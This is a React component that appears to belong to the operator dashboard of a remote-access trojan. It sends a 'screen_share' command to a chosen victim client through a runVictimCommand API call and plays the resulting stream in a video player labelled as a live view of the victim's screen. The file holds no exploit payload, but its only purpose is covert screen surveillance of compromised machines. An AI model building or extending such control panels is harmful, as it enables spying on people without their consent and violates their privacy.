import React, { useEffect, useRef, useState } from "react";
import { runVictimCommand } from "../../../service/api.service";
import { useLocation } from "react-router-dom";

const ScreenCapture: React.FC = () => {
  const [clientId, setClientId] = useState<number>(0); // [1]
  const location = useLocation();
  const videoRef = useRef<HTMLVideoElement | null>(null);

  const handleClick = () => {
    // Define the video source URL (replace with your actual URL)
    const startBroadcast = async () => {
      const hash = location.hash;

      // Use a regular expression to find the 'id' query parameter in the hash
      const match = hash.match(/id=([^&]+)/);

      if (match) {
        setClientId(parseInt(match[1] || "0"));
        // Extract the 'id' value from the matched result
        const clientId = match[1];

        const response = await runVictimCommand(
          parseInt(clientId),
          "screen_share",
          "function"
        );

        console.log(response.data.output);
      }
    };
    startBroadcast();
    const videoSourceUrl =
      "http://localhost:8080/clients/" + clientId + "/screenshare";

    // Check if the video element exists
    if (videoRef.current) {
      // Set the video source
      videoRef.current.src = videoSourceUrl;

      // Play the video
      videoRef.current.play().catch((error) => {
        console.error("Error playing video:", error);
      });
    }
  };

  return (
    <div>
      <h1 className="text-2xl font-bold mb-4">Screen Capture</h1>
      <p className="text-gray-600 mb-4">
        This is a live video stream of the victim's screen.
      </p>
      <div className="flex flex-row items-center">
        <button
          className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"
          onClick={handleClick}
        >
          Start Recording
        </button>

        <button className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded ml-4">
          Stop Recording
        </button>
      </div>

      {/* Video Player */}
      <div>
        <video
          ref={videoRef}
          className="w-full h-auto"
          controls
          poster="/placeholder-image.jpg" // Add a placeholder image
        >
          Your browser does not support the video tag.
        </video>
      </div>
    </div>
  );
};

export default ScreenCapture;
